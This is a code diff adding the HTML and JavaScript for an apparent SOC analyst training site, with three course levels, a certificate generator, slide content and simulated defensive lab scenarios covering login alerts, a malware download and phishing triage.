+      <div class="cert-status locked-s" id="cert-status-l2">LOCKED</div>
+      <button class="gen-cert-btn" id="cert-btn-l2" onclick="openCertModal('l2')">GENERATE CERTIFICATE</button>
+    </div>
+    <div class="cert-card" id="cert-card-l3">
+      <div class="cert-icon">🏆</div>
+      <h4>L3 EXPERT</h4>
+      <p>Complete all 6 modules and pass the L3 assessment</p>
+      <div class="cert-status locked-s" id="cert-status-l3">LOCKED</div>
+      <button class="gen-cert-btn" id="cert-btn-l3" onclick="openCertModal('l3')">GENERATE CERTIFICATE</button>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════ L1 ════════════ -->
+<div class="level-panel" id="panel-l1">
+  <div class="section-header">
+    <div class="level-tag">SOC L1</div>
+    <h2>Threat Identification & Basic Incident Response</h2>
+  </div>
+  <div class="sub-tabs">
+    <button class="sub-tab active" onclick="switchSubTab('l1','curriculum',this)">CURRICULUM</button>
+    <button class="sub-tab" onclick="switchSubTab('l1','videos',this)">VIDEOS</button>
+    <button class="sub-tab" onclick="switchSubTab('l1','slides',this)">SLIDES</button>
+    <button class="sub-tab" onclick="switchSubTab('l1','lab',this)">LAB</button>
+    <button class="sub-tab" onclick="switchSubTab('l1','quiz',this)">QUIZ</button>
+  </div>
+  <div class="content-pane active" id="l1-curriculum">
+    <div class="module-grid" id="l1-module-grid"></div>
+  </div>
+  <div class="content-pane" id="l1-videos">
+    <div id="l1-video-content"></div>
+  </div>
+  <div class="content-pane" id="l1-slides">
+    <div class="slide-container">
+      <div class="slide-topbar">
+        <div class="slide-dots"><span></span><span></span><span></span></div>
+        <div class="slide-title-bar">SOC L1 · ANIMATED SLIDES</div>
+        <div class="slide-progress" id="l1-pips"></div>
+      </div>
+      <div class="slide-content" id="l1-slide-content"></div>
+      <div class="slide-nav">
+        <button class="slide-nav-btn" id="l1-prev" onclick="changeSlide('l1',-1)" disabled>◀ PREV</button>
+        <span class="slide-counter" id="l1-counter">1 / 5</span>
+        <button class="slide-nav-btn" id="l1-next" onclick="changeSlide('l1',1)">NEXT ▶</button>
+      </div>
+    </div>
+  </div>
+  <div class="content-pane" id="l1-lab">
+    <div class="lab-container">
+      <div class="lab-sidebar">
+        <div class="lab-sidebar-header">// SCENARIOS</div>
+        <div id="l1-scenario-list"></div>
+      </div>
+      <div class="lab-main" id="l1-lab-main"></div>
+    </div>
+  </div>
+  <div class="content-pane" id="l1-quiz">
+    <div class="quiz-container">
+      <div class="quiz-header">
+        <div style="font-family:'Rajdhani',sans-serif;font-size:1.15rem;font-weight:700;letter-spacing:1px;">L1 KNOWLEDGE CHECK</div>
+        <div class="quiz-score">SCORE: <span id="l1-score">0</span>/5</div>
+      </div>
+      <div id="l1-quiz-body"></div>
+      <div class="quiz-complete" id="l1-quiz-complete">
+        <h3>ASSESSMENT COMPLETE</h3>
+        <div class="score-big" id="l1-final-score"></div>
+        <p>Questions answered correctly</p>
+        <button class="quiz-btn" onclick="resetQuiz('l1')">RETRY ASSESSMENT</button>
+        <br>
+        <button class="cert-unlock-btn" id="l1-cert-unlock" onclick="openCertModal('l1')">🏅 GENERATE CERTIFICATE</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════ L2 ════════════ -->
+<div class="level-panel" id="panel-l2">
+  <div class="section-header">
+    <div class="level-tag">SOC L2</div>
+    <h2>Advanced Analysis & Complex Threat Handling</h2>
+  </div>
+  <div class="sub-tabs">
+    <button class="sub-tab active" onclick="switchSubTab('l2','curriculum',this)">CURRICULUM</button>
+    <button class="sub-tab" onclick="switchSubTab('l2','videos',this)">VIDEOS</button>
+    <button class="sub-tab" onclick="switchSubTab('l2','slides',this)">SLIDES</button>
+    <button class="sub-tab" onclick="switchSubTab('l2','lab',this)">LAB</button>
+    <button class="sub-tab" onclick="switchSubTab('l2','quiz',this)">QUIZ</button>
+  </div>
+  <div class="content-pane active" id="l2-curriculum">
+    <div class="module-grid" id="l2-module-grid"></div>
+  </div>
+  <div class="content-pane" id="l2-videos"><div id="l2-video-content"></div></div>
+  <div class="content-pane" id="l2-slides">
+    <div class="slide-container">
+      <div class="slide-topbar">
+        <div class="slide-dots"><span></span><span></span><span></span></div>
+        <div class="slide-title-bar">SOC L2 · ANIMATED SLIDES</div>
+        <div class="slide-progress" id="l2-pips"></div>
+      </div>
+      <div class="slide-content" id="l2-slide-content"></div>
+      <div class="slide-nav">
+        <button class="slide-nav-btn" id="l2-prev" onclick="changeSlide('l2',-1)" disabled>◀ PREV</button>
+        <span class="slide-counter" id="l2-counter">1 / 5</span>
+        <button class="slide-nav-btn" id="l2-next" onclick="changeSlide('l2',1)">NEXT ▶</button>
+      </div>
+    </div>
+  </div>
+  <div class="content-pane" id="l2-lab">
+    <div class="lab-container">
+      <div class="lab-sidebar">
+        <div class="lab-sidebar-header">// SCENARIOS</div>
+        <div id="l2-scenario-list"></div>
+      </div>
+      <div class="lab-main" id="l2-lab-main"></div>
+    </div>
+  </div>
+  <div class="content-pane" id="l2-quiz">
+    <div class="quiz-container">
+      <div class="quiz-header">
+        <div style="font-family:'Rajdhani',sans-serif;font-size:1.15rem;font-weight:700;letter-spacing:1px;">L2 KNOWLEDGE CHECK</div>
+        <div class="quiz-score">SCORE: <span id="l2-score">0</span>/5</div>
+      </div>
+      <div id="l2-quiz-body"></div>
+      <div class="quiz-complete" id="l2-quiz-complete">
+        <h3>ASSESSMENT COMPLETE</h3>
+        <div class="score-big" id="l2-final-score"></div>
+        <p>Questions answered correctly</p>
+        <button class="quiz-btn" onclick="resetQuiz('l2')">RETRY ASSESSMENT</button><br>
+        <button class="cert-unlock-btn" id="l2-cert-unlock" onclick="openCertModal('l2')">🏅 GENERATE CERTIFICATE</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════ L3 ════════════ -->
+<div class="level-panel" id="panel-l3">
+  <div class="section-header">
+    <div class="level-tag">SOC L3</div>
+    <h2>Malware Analysis, Forensics & Red Teaming</h2>
+  </div>
+  <div class="sub-tabs">
+    <button class="sub-tab active" onclick="switchSubTab('l3','curriculum',this)">CURRICULUM</button>
+    <button class="sub-tab" onclick="switchSubTab('l3','videos',this)">VIDEOS</button>
+    <button class="sub-tab" onclick="switchSubTab('l3','slides',this)">SLIDES</button>
+    <button class="sub-tab" onclick="switchSubTab('l3','lab',this)">LAB</button>
+    <button class="sub-tab" onclick="switchSubTab('l3','quiz',this)">QUIZ</button>
+  </div>
+  <div class="content-pane active" id="l3-curriculum">
+    <div class="module-grid" id="l3-module-grid"></div>
+  </div>
+  <div class="content-pane" id="l3-videos"><div id="l3-video-content"></div></div>
+  <div class="content-pane" id="l3-slides">
+    <div class="slide-container">
+      <div class="slide-topbar">
+        <div class="slide-dots"><span></span><span></span><span></span></div>
+        <div class="slide-title-bar">SOC L3 · ANIMATED SLIDES</div>
+        <div class="slide-progress" id="l3-pips"></div>
+      </div>
+      <div class="slide-content" id="l3-slide-content"></div>
+      <div class="slide-nav">
+        <button class="slide-nav-btn" id="l3-prev" onclick="changeSlide('l3',-1)" disabled>◀ PREV</button>
+        <span class="slide-counter" id="l3-counter">1 / 5</span>
+        <button class="slide-nav-btn" id="l3-next" onclick="changeSlide('l3',1)">NEXT ▶</button>
+      </div>
+    </div>
+  </div>
+  <div class="content-pane" id="l3-lab">
+    <div class="lab-container">
+      <div class="lab-sidebar">
+        <div class="lab-sidebar-header">// SCENARIOS</div>
+        <div id="l3-scenario-list"></div>
+      </div>
+      <div class="lab-main" id="l3-lab-main"></div>
+    </div>
+  </div>
+  <div class="content-pane" id="l3-quiz">
+    <div class="quiz-container">
+      <div class="quiz-header">
+        <div style="font-family:'Rajdhani',sans-serif;font-size:1.15rem;font-weight:700;letter-spacing:1px;">L3 KNOWLEDGE CHECK</div>
+        <div class="quiz-score">SCORE: <span id="l3-score">0</span>/5</div>
+      </div>
+      <div id="l3-quiz-body"></div>
+      <div class="quiz-complete" id="l3-quiz-complete">
+        <h3>ASSESSMENT COMPLETE</h3>
+        <div class="score-big" id="l3-final-score"></div>
+        <p>Questions answered correctly</p>
+        <button class="quiz-btn" onclick="resetQuiz('l3')">RETRY ASSESSMENT</button><br>
+        <button class="cert-unlock-btn" id="l3-cert-unlock" onclick="openCertModal('l3')">🏆 GENERATE CERTIFICATE</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /main -->
+
+<!-- CERTIFICATE MODAL -->
+<div class="modal-overlay" id="cert-modal">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeCertModal()">✕</button>
+    <div class="cert-preview">
+      <div class="cert-document" id="cert-doc">
+        <div class="cert-corner tl"></div>
+        <div class="cert-corner tr"></div>
+        <div class="cert-corner bl"></div>
+        <div class="cert-corner br"></div>
+        <div class="cert-logo">CCA SOLUTIONS · CYBER CAREER ACADEMY</div>
+        <div class="cert-presents">THIS CERTIFIES THAT</div>
+        <div class="cert-name" id="cert-name-display">YOUR NAME HERE</div>
+        <div class="cert-presents">HAS SUCCESSFULLY COMPLETED</div>
+        <div class="cert-title" id="cert-title-display">SOC <span>ANALYST</span> LEVEL 1</div>
+        <div class="cert-level-badge" id="cert-badge-display" style="color:var(--cyan);border-color:var(--cyan);">SOC L1 · THREAT IDENTIFICATION & BASIC INCIDENT RESPONSE</div>
+        <div class="cert-body-text" id="cert-body-display">Demonstrating proficiency in threat identification, alert triage, log analysis, and basic incident response as defined by the CCA Solutions SOC Analyst Training Program.</div>
+        <div class="cert-meta">
+          <div class="cert-meta-item">
+            <span class="cert-meta-label">DATE ISSUED</span>
+            <div class="cert-meta-val" id="cert-date-display"></div>
+          </div>
+          <div class="cert-meta-item">
+            <span class="cert-meta-label">ISSUED BY</span>
+            <div class="cert-meta-val">CCA Solutions</div>
+          </div>
+          <div class="cert-meta-item">
+            <span class="cert-meta-label">LOCATION</span>
+            <div class="cert-meta-val">Calgary, Canada</div>
+          </div>
+        </div>
+        <div class="cert-id" id="cert-id-display"></div>
+      </div>
+    </div>
+    <div class="modal-actions">
+      <input type="text" id="cert-name-input" placeholder="Enter your full name..." oninput="updateCertName(this.value)">
+      <button class="modal-act-btn btn-print" onclick="window.print()">🖨 PRINT / SAVE PDF</button>
+      <button class="modal-act-btn btn-cancel" onclick="closeCertModal()">CLOSE</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════
+// DATA — MODULES
+// ═══════════════════════════════════════════
+const MODULES = {
+  l1:[
+    {num:'01',title:'Cybersecurity Foundations',desc:"Build the mental model of how digital threats work — before touching any tools.",topics:['What is cybersecurity and why it matters','The CIA triad: Confidentiality, Integrity, Availability','Threat actors: hackers, nation-states, insiders','Attack surface: networks, endpoints, humans','Security terminology crash course'],hrs:6,vids:8,labs:1},
+    {num:'02',title:'How Networks Actually Work',desc:"You can't spot anomalies without knowing what normal looks like.",topics:['IP addresses, subnets, and DNS explained simply','TCP/IP model and how data travels','Common protocols: HTTP, HTTPS, FTP, SSH, RDP','Ports and services — what\'s listening and why','Reading network diagrams'],hrs:7,vids:10,labs:2},
+    {num:'03',title:'How Attacks Happen',desc:"Walk through the attacker's playbook so you can recognize each stage.",topics:['The Cyber Kill Chain explained','Phishing, malware delivery, and social engineering','What happens when malware runs','Lateral movement and privilege escalation concepts','Common attack patterns beginners see in alerts'],hrs:7,vids:9,labs:2},
+    {num:'04',title:'Alert Triage & Investigation',desc:"The core SOC L1 skill — turning a sea of alerts into prioritized incidents.",topics:['What a SIEM is and how analysts use it','Reading and interpreting security alerts','True positive vs false positive — how to decide','Severity levels: P1 through P4','Escalation: when to call the L2 analyst'],hrs:8,vids:11,labs:3},
+    {num:'05',title:'Log Analysis Basics',desc:"Logs tell the story. Learn to read Windows Event Logs, firewall logs, and auth logs.",topics:['Where logs come from: OS, network, application','Windows Event IDs every analyst must know','Linux syslog and auth log basics','Firewall and proxy logs — what each field means','Writing basic search queries in a SIEM'],hrs:7,vids:9,labs:3},
+    {num:'06',title:'Basic Incident Response',desc:"What to do when it's real. A step-by-step framework any beginner can follow.",topics:['The NIST 800-61 incident response lifecycle','Containment — isolating a compromised machine','Collecting evidence without destroying it','Writing a clear, useful incident ticket','Post-incident communication and reporting'],hrs:5,vids:7,labs:2}
+  ],
+  l2:[
+    {num:'01',title:'SIEM Deployment & Management',desc:"Go beyond reading alerts — learn to build the system that generates them.",topics:['Splunk and QRadar architecture deep-dive','Ingesting log sources: agents, syslog, APIs','Building correlation rules from scratch','Tuning alerts — reducing alert fatigue','Dashboards for SOC team situational awareness'],hrs:9,vids:12,labs:3},
+    {num:'02',title:'Advanced Log Correlation',desc:"Spot multi-stage attacks that look innocent when viewed one log at a time.",topics:['Chaining events across multiple log sources','Time-based correlation techniques','Baseline behavior profiling (UEBA basics)','Detecting living-off-the-land attacks','Building timelines of attacker activity'],hrs:8,vids:10,labs:3},
+    {num:'03',title:'Threat Intelligence Utilization',desc:"Use structured intelligence to make faster, smarter decisions during incidents.",topics:['IOCs, TTPs, and threat feeds explained','MITRE ATT&CK framework in practice','Integrating threat intel into SIEM workflows','Diamond Model for incident analysis','Sharing intel: STIX/TAXII basics'],hrs:8,vids:10,labs:2},
+    {num:'04',title:'Network Packet Analysis',desc:"Read raw traffic with Wireshark. See attacks at the packet level.",topics:['Packet capture fundamentals with Wireshark','Reconstructing sessions from PCAP files','Identifying C2 traffic patterns','DNS tunneling and exfiltration detection','TLS inspection concepts'],hrs:9,vids:11,labs:4},
+    {num:'05',title:'SOAR Concepts & Playbooks',desc:"Automate repetitive tasks and build response workflows that scale.",topics:['What SOAR is and how it fits in the SOC','Building your first automated playbook','Integrating SOAR with SIEM and ticketing','Phishing response automation end-to-end','Metrics: measuring what automation saves you'],hrs:8,vids:9,labs:3},
+    {num:'06',title:'Complex Incident Handling',desc:"Lead multi-team response to serious incidents — ransomware, insiders, APTs.",topics:['Ransomware incident response step-by-step','Insider threat detection and response','Coordinating with IT, legal, and management','Evidence preservation and chain of custody','Post-incident root cause analysis reports'],hrs:8,vids:10,labs:3}
+  ],
+  l3:[
+    {num:'01',title:'Malware Triage & Analysis',desc:"Dissect malicious code safely. Understand what it does before it does it to you.",topics:['Safe malware analysis environments (sandboxes)','Static analysis: strings, imports, hashes','Dynamic analysis: behavior monitoring tools','Common malware families: RATs, stealers, loaders','Writing malware analysis reports'],hrs:12,vids:14,labs:4},
+    {num:'02',title:'Digital Forensics',desc:"Reconstruct exactly what happened, when, and who did it.",topics:['Forensic acquisition without contaminating evidence','Windows registry forensics','Browser history and artifact recovery','Memory forensics with Volatility','Filesystem timeline analysis'],hrs:12,vids:13,labs:5},
+    {num:'03',title:'Phishing & Email Forensics',desc:"Go past 'it looks suspicious' — extract hard evidence from email headers.",topics:['Email header analysis: tracing the source','Attachment analysis: macros, scripts, exploits','Spearphishing vs mass phishing campaigns','Domain spoofing and lookalike detection','Takedown procedures for phishing infrastructure'],hrs:8,vids:10,labs:3},
+    {num:'04',title:'OSINT for Threat Intelligence',desc:"Find attacker infrastructure and threat actor profiles using open sources.",topics:['OSINT frameworks: Maltego, SpiderFoot','Dark web monitoring basics','Tracking threat actor campaigns','Shodan and Censys for attack surface intel','Passive DNS and IP pivot techniques'],hrs:8,vids:10,labs:3},
+    {num:'05',title:'Threat Hunting Methodologies',desc:"Stop waiting for alerts. Proactively search for threats that bypassed detection.",topics:['Hypothesis-driven threat hunting','Hunt for common persistence mechanisms','Detecting anomalous process behavior','Using MITRE ATT&CK to guide hunts','Documenting and operationalizing hunt results'],hrs:10,vids:12,labs:4},
+    {num:'06',title:'Red Teaming Fundamentals',desc:"Think like an attacker. Simulate real adversary techniques to expose gaps.",topics:['Red team vs penetration test: key differences','Common attack tools: Metasploit, Cobalt Strike concepts','Social engineering simulations','Purple team exercises — defense and offense together','Writing a red team engagement report'],hrs:10,vids:12,labs:4}
+  ]
+};
+
+// VIDEO SLOTS per level — 3 placeholders per module group
+const VIDEO_SLOTS = {
+  l1:[
+    {title:'Module 1–2: Foundations & Networking',sub:'BEGINNER · ~90 MIN'},
+    {title:'Module 3–4: Attacks & Alert Triage',sub:'BEGINNER · ~2 HRS'},
+    {title:'Module 5–6: Logs & Incident Response',sub:'BEGINNER · ~90 MIN'}
+  ],
+  l2:[
+    {title:'Module 1–2: SIEM & Log Correlation',sub:'INTERMEDIATE · ~2 HRS'},
+    {title:'Module 3–4: Threat Intel & Packets',sub:'INTERMEDIATE · ~2 HRS'},
+    {title:'Module 5–6: SOAR & Complex IR',sub:'INTERMEDIATE · ~90 MIN'}
+  ],
+  l3:[
+    {title:'Module 1–2: Malware & Forensics',sub:'ADVANCED · ~2.5 HRS'},
+    {title:'Module 3–4: Phishing & OSINT',sub:'ADVANCED · ~2 HRS'},
+    {title:'Module 5–6: Threat Hunting & Red Team',sub:'ADVANCED · ~2 HRS'}
+  ]
+};
+
+// SLIDES
+const SLIDES = {
+  l1:[
+    {eyebrow:'MODULE 01 · FOUNDATIONS',title:'What is a SOC?',points:[{icon:'🏢',title:'Security Operations Center',desc:'A team and a place — staffed 24/7 to monitor, detect, and respond to threats targeting an organization.'},{icon:'🔍',title:'What SOC Analysts Do',desc:'Watch dashboards, investigate alerts, triage incidents, and escalate serious threats to more senior analysts.'},{icon:'⚡',title:'The L1 Role',desc:'First line of defense. You receive every alert and decide: is this real or noise? Everything starts here.'},{icon:'🎯',title:'Who Attacks and Why',desc:'Criminals after money, nation-states after data, insiders making mistakes — each type leaves different traces.'}]},
+    {eyebrow:'MODULE 02 · NETWORKING',title:'How Data Travels Across Networks',points:[{icon:'📦',title:'Packets',desc:'All data on a network is broken into small packets. Each packet has a source, destination, and payload.'},{icon:'🗺️',title:'IP Addresses',desc:'Like a postal address for your device. Every device on a network has one. Knowing this helps you trace connections.'},{icon:'🔌',title:'Ports & Protocols',desc:'Port 80 is HTTP, 443 is HTTPS, 22 is SSH. Attackers often use familiar ports to blend in.'},{icon:'🔎',title:'Spotting the Abnormal',desc:'Traffic to unusual countries at 3am. A laptop scanning hundreds of IPs. These patterns trigger investigation.'}]},
+    {eyebrow:'MODULE 03 · ATTACKS',title:'The Cyber Kill Chain',points:[{icon:'🎣',title:'1. Reconnaissance & Delivery',desc:'Attacker researches the target, then delivers a payload — usually via phishing email or malicious link.'},{icon:'💥',title:'2. Exploitation & Installation',desc:'Payload executes. Malware installs itself. The attacker now has a foothold inside the network.'},{icon:'📡',title:'3. Command & Control (C2)',desc:'Malware phones home. Attacker sends commands remotely — often over normal-looking HTTPS traffic.'},{icon:'🏴',title:'4. Actions on Objectives',desc:'Data exfiltration, ransomware deployment, credential theft — the actual goal of the attack.'}]},
+    {eyebrow:'MODULE 04 · ALERT TRIAGE',title:'True Positive vs False Positive',points:[{icon:'✅',title:'True Positive',desc:'A real threat. The alert fired because something genuinely malicious happened. Needs immediate action.'},{icon:'❌',title:'False Positive',desc:'A false alarm. Legitimate activity that triggered the rule incorrectly. Document it and tune the rule.'},{icon:'⚠️',title:'How to Decide',desc:'Check context: who triggered it, from where, at what time, what happened before and after.'},{icon:'📋',title:'When to Escalate',desc:'If you see lateral movement, data exfiltration indicators, or confirmed malware — escalate to L2 immediately.'}]},
+    {eyebrow:'MODULE 06 · INCIDENT RESPONSE',title:'NIST 800-61: The IR Lifecycle',points:[{icon:'🛡️',title:'1. Preparation',desc:'Have your playbooks, tools, and team ready before anything happens. IR under pressure without prep fails.'},{icon:'🔍',title:'2. Detection & Analysis',desc:'Confirm the incident is real. Gather evidence. Determine scope — what systems are affected?'},{icon:'🧱',title:'3. Containment',desc:'Stop the bleeding. Isolate infected machines from the network before they spread the infection further.'},{icon:'🔁',title:'4. Recovery & Lessons Learned',desc:'Restore systems. Document everything. Hold a retrospective so the team learns and improves.'}]}
+  ],
+  l2:[
+    {eyebrow:'MODULE 01 · SIEM',title:'Inside Splunk & QRadar',points:[{icon:'🗄️',title:'Log Ingestion',desc:'SIEM collects logs from hundreds of sources: firewalls, endpoints, cloud, email — all in real time.'},{icon:'⚙️',title:'Correlation Rules',desc:'Rules define when to trigger an alert. Example: 5 failed logins followed by 1 success = brute force alert.'},{icon:'📊',title:'Dashboards',desc:'Visual overview of your environment. Good dashboards show what\'s normal so anomalies stand out.'},{icon:'🔧',title:'Alert Tuning',desc:'Too many alerts means analysts ignore them. Tuning rules to reduce noise is a critical L2 skill.'}]},
+    {eyebrow:'MODULE 03 · THREAT INTEL',title:'MITRE ATT&CK Framework',points:[{icon:'🗂️',title:'What It Is',desc:'A knowledge base of real adversary tactics, techniques, and procedures — organized into a navigable matrix.'},{icon:'🎯',title:'Tactics vs Techniques',desc:'Tactics are the goal (e.g. Persistence). Techniques are how they achieve it (e.g. Registry Run Keys).'},{icon:'🔗',title:'Linking Alerts to ATT&CK',desc:'Tag every alert with an ATT&CK technique ID. This helps you see which kill chain stage an attack is in.'},{icon:'🛡️',title:'Gap Analysis',desc:'Use ATT&CK to identify which techniques you have no detection for — your blind spots.'}]},
+    {eyebrow:'MODULE 04 · PACKET ANALYSIS',title:'Reading Network Traffic',points:[{icon:'🦈',title:'Wireshark Basics',desc:'Wireshark captures every packet on a network interface. Filter by IP, port, or protocol to find what you need.'},{icon:'🌐',title:'Reconstructing Sessions',desc:'Follow a TCP stream to reassemble a full HTTP conversation — see exactly what data was transferred.'},{icon:'📡',title:'C2 Traffic Patterns',desc:'Beaconing: malware calls home every N seconds like clockwork. Regular intervals in traffic = red flag.'},{icon:'🕳️',title:'DNS Tunneling',desc:'Attackers hide data in DNS queries. Unusually long domain names or high DNS volume signals this technique.'}]},
+    {eyebrow:'MODULE 05 · SOAR',title:'Automating Incident Response',points:[{icon:'⚡',title:'What SOAR Does',desc:'Connects your security tools and automates repetitive tasks — enrichment, containment, notifications.'},{icon:'📋',title:'Playbooks',desc:'Step-by-step automated workflows. A phishing playbook might auto-extract URLs, check reputation, and block.'},{icon:'🔗',title:'Integrations',desc:'SOAR connects to SIEM, EDR, firewall, ticketing — acting as the glue between tools.'},{icon:'📈',title:'Measuring Impact',desc:'Mean time to respond (MTTR) should drop dramatically with automation. Track before and after.'}]},
+    {eyebrow:'MODULE 06 · INCIDENT HANDLING',title:'Ransomware Response Playbook',points:[{icon:'🚨',title:'Step 1: Isolate',desc:'Cut the infected machine from the network immediately. Ransomware spreads fast — every second counts.'},{icon:'📸',title:'Step 2: Preserve Evidence',desc:'Take a memory dump and disk image before removing the threat. Evidence disappears when you power off.'},{icon:'🔍',title:'Step 3: Identify the Variant',desc:'Use VirusTotal, sandbox, or ID Ransomware to identify the family. Determines if decryption is possible.'},{icon:'🔁',title:'Step 4: Recover from Backup',desc:'Verify backups are clean and unaffected. Restore systems. Patch the entry point before reconnecting.'}]}
+  ],
+  l3:[
+    {eyebrow:'MODULE 01 · MALWARE ANALYSIS',title:'Dissecting Malicious Code',points:[{icon:'🏖️',title:'Sandboxing',desc:'Execute malware in an isolated VM (Any.run, Cuckoo) and watch what it does — safely, with no risk.'},{icon:'🔬',title:'Static Analysis',desc:'Examine the file without running it. Strings, imported functions, and entropy reveal intent.'},{icon:'🧪',title:'Dynamic Analysis',desc:'Run it and monitor: what files does it create? What registry keys? What network connections?'},{icon:'📝',title:'Reporting Findings',desc:'Translate technical findings into actionable intelligence for the SOC team and management.'}]},
+    {eyebrow:'MODULE 02 · FORENSICS',title:'Memory Forensics with Volatility',points:[{icon:'🧠',title:'Why Memory Matters',desc:'Fileless malware lives entirely in RAM. Kill the process or reboot, and evidence is gone forever.'},{icon:'⚙️',title:'Process Analysis',desc:'List running processes and spot injected code, hollow processes, or processes hiding under legitimate names.'},{icon:'🌐',title:'Network Artifacts',desc:'Extract active and recent network connections from memory — including those malware tried to hide.'},{icon:'🔑',title:'Credential Extraction',desc:'Attackers dump credentials from memory (LSASS). Understanding this helps you detect and counter it.'}]},
+    {eyebrow:'MODULE 05 · THREAT HUNTING',title:'Hypothesis-Driven Hunting',points:[{icon:'💡',title:'Start with a Hypothesis',desc:'Example: "An attacker has established persistence via scheduled tasks." Then prove or disprove it.'},{icon:'📊',title:'Stack Counting',desc:'List all scheduled tasks across endpoints and count frequency. Rare or unique ones deserve investigation.'},{icon:'🗺️',title:'Use ATT&CK as a Hunt Guide',desc:'Pick a technique your team has no detection for. Build a hunt to find evidence it\'s being used.'},{icon:'🔄',title:'Operationalize Results',desc:'Every successful hunt should produce a detection rule so the next occurrence gets caught automatically.'}]},
+    {eyebrow:'MODULE 06 · RED TEAMING',title:'Thinking Like an Attacker',points:[{icon:'🎯',title:'Red Team vs Pentest',desc:'Pentest is scoped and time-limited. Red team simulates a full adversary campaign with stealth as a priority.'},{icon:'🎭',title:'Social Engineering',desc:'Most attacks start with humans, not technology. Vishing, pretexting, and phishing simulations test the human layer.'},{icon:'🟣',title:'Purple Teaming',desc:'Red and blue team up. Red runs a technique, blue tries to detect it. Immediate feedback improves both sides.'},{icon:'📋',title:'Engagement Reports',desc:'What was tested, what was found, what is the business risk — in plain language for leadership.'}]},
+    {eyebrow:'MODULE 04 · OSINT',title:'Open Source Intelligence',points:[{icon:'🔭',title:'Shodan & Censys',desc:'Search engines for internet-facing devices. Find your own exposed assets before attackers do.'},{icon:'🕸️',title:'Passive DNS',desc:'Trace historical DNS records to find infrastructure that threat actors have used across campaigns.'},{icon:'🗺️',title:'Maltego Pivoting',desc:'Visually map connections between IPs, domains, emails, and threat actors to build a complete picture.'},{icon:'🌑',title:'Dark Web Monitoring',desc:'Monitor paste sites and forums for leaked credentials, company data, or mentions of your organization.'}]}
+  ]
+};
+
+// SCENARIOS — 5 per level (was 3)
+const SCENARIOS = {
+  l1:[
+    {name:'Suspicious Login Alert',tag:'easy',brief:'Your SIEM fired: "Multiple failed logins followed by successful auth." User: j.smith@company.com. Source IP: 185.234.91.12 (Russia). Time: 03:14 AM local.',objectives:['Determine if true positive','Identify relevant Event IDs','Recommend containment'],steps:[{cmd:'',out:[['term-info','=== SIEM ALERT RECEIVED ==='],['term-dim','Alert ID:    SOC-2024-00441'],['term-warn','Severity:    HIGH [P2]'],['term-dim','User:        j.smith@company.com'],['term-dim','Source IP:   185.234.91.12 | Russia'],['term-dim','Time:        03:14:22 UTC'],['',' ']]},{cmd:'geoip 185.234.91.12',out:[['term-ok','  IP: 185.234.91.12 | Russia (RU)'],['term-alert','  ASN: Known bulletproof hosting provider'],['term-alert','  VPN/Proxy: YES — flagged in threat intel feeds'],['',' ']]},{cmd:'user-history j.smith --last 7d',out:[['term-ok','  2024-01-14 08:45 | Toronto, CA  ✓'],['term-ok','  2024-01-15 09:02 | Toronto, CA  ✓'],['term-alert','  2024-01-17 03:14 | Russia        ← ANOMALY'],['term-warn','  → Never logged in from outside Canada'],['',' ']]},{cmd:'disable-account j.smith --reason "Suspected compromise"',out:[['term-ok','  ✓ Account j.smith DISABLED'],['term-ok','  ✓ All active sessions terminated'],['term-info','  VERDICT: TRUE POSITIVE — Account Compromise'],['',' ']]}]},
+    {name:'Malware Download Detected',tag:'easy',brief:'Proxy logs flagged invoice_2024.exe downloaded on WKST-034 (Finance). AV: Clean. File size: 2.4MB. Time: 14:22.',objectives:['Assess file reputation','Determine if executed','Contain the endpoint'],steps:[{cmd:'',out:[['term-info','=== PROXY ALERT: SUSPICIOUS DOWNLOAD ==='],['term-dim','Endpoint: WKST-034 (Finance)'],['term-dim','File:     invoice_2024.exe'],['term-warn','AV:       Clean (0/72 engines)'],['',' ']]},{cmd:'hash-lookup sha256:a9f2d1c8b4',out:[['term-alert','  VirusTotal: 3/72 — Trojan.GenericKD (new variant)'],['term-warn','  Hybrid Analysis: SUSPICIOUS — network connections'],['term-alert','  Sandbox verdict: MALICIOUS — stealer behavior'],['',' ']]},{cmd:'edr-query WKST-034 --process invoice_2024.exe',out:[['term-alert','  PROCESS EXECUTED at 14:22:07'],['term-alert','  Child process: cmd.exe → powershell.exe'],['term-alert','  Network: Outbound to 91.215.14.88:443'],['term-alert','  Registry: HKCU\\Run → svchost32.exe (PERSISTENCE!)'],['',' ']]},{cmd:'isolate-host WKST-034',out:[['term-ok','  ✓ WKST-034 network isolated via EDR'],['term-ok','  ✓ C2 IP blocked at perimeter firewall'],['term-info','  VERDICT: Active infection + C2 communication'],['',' ']]}]},
+    {name:'Phishing Email Investigation',tag:'med',brief:'User reported suspicious email: "URGENT: Account expires in 2 hours." Sender: it-support@company-helpdesk.net',objectives:['Analyze sender domain','Extract & check URLs','Block organization-wide'],steps:[{cmd:'',out:[['term-info','=== REPORTED PHISHING EMAIL ==='],['term-dim','From: it-support@company-helpdesk.net'],['term-dim','Subject: URGENT: Your account expires in 2 hours'],['',' ']]},{cmd:'domain-check company-helpdesk.net',out:[['term-warn','  Registered: 3 days ago'],['term-alert','  Similar to: company.com — TYPOSQUAT DETECTED'],['term-alert','  Threat Intel: Domain in phishing campaign database'],['',' ']]},{cmd:'extract-urls email-00441.eml | url-scan',out:[['term-alert','  URL → Credential harvester at 185.244.31.12'],['term-alert','  Page mimics Microsoft 365 login UI'],['',' ']]},{cmd:'email-remediate --sender company-helpdesk.net --delete-all',out:[['term-ok','  ✓ 14 copies deleted from all mailboxes'],['term-ok','  ✓ Domain added to email blocklist'],['term-ok','  ✓ User awareness alert sent to all staff'],['',' ']]}]},
